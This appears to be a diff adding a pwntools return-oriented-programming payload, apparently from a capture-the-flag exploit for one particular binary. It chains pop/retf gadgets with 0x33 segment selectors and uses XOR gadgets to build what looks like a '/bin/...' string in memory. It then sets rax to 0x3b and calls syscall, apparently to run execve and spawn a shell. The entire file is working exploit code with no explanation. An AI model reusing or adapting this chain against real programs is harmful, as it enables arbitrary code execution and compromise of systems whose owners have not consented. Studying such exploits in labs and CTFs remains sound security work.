@@ -1,0 +1,23 @@
+payload = p64(0x444dca)
+#0x444dca: pop rdx ; retf
+payload += p64(0x6e69622f)+p32(0x4edc0a)+p32(0x33)
+# 0x00000000004edc0a: pop rsi; ret; 
+payload += p64(0x3b719058)+p64(0x5645cb)
+# 0x5645cb: xor dword ptr [rsi - 0x3b180000], edx ; retf
+payload += p32(0x444dca)+p32(0x33)
+# 0x444dca: pop rdx ; retf
+payload += p64(0x68662f)+p32(0x4edc0a)+p32(0x33)
+# 0x00000000004edc0a: pop rsi; ret; 
+payload += p64(0x3b71905c)+p64(0x5645cb)
+# 0x5645cb: xor dword ptr [rsi - 0x3b180000], edx ; retf
+payload += p32(0x444dca)+p32(0x33)
+# 0x444dca: pop rdx ; retf
+payload += p64(0x0)+p32(0x40c7f0)+p32(0x33)
+# 0x000000000040c7f0: pop rax; ret; 
+payload += p64(0x3b)+p64(0x524f25)
+# 0x0000000000524f25: pop rdi; ret; 
+payload += p64(0x599058)+p64(0x4edc0a)
+# 0x00000000004edc0a: pop rsi; ret; 
+payload += p64(0x0)+p64(0x4201ad)
+# 0x00000000004201ad: syscall; 
+payload += b''
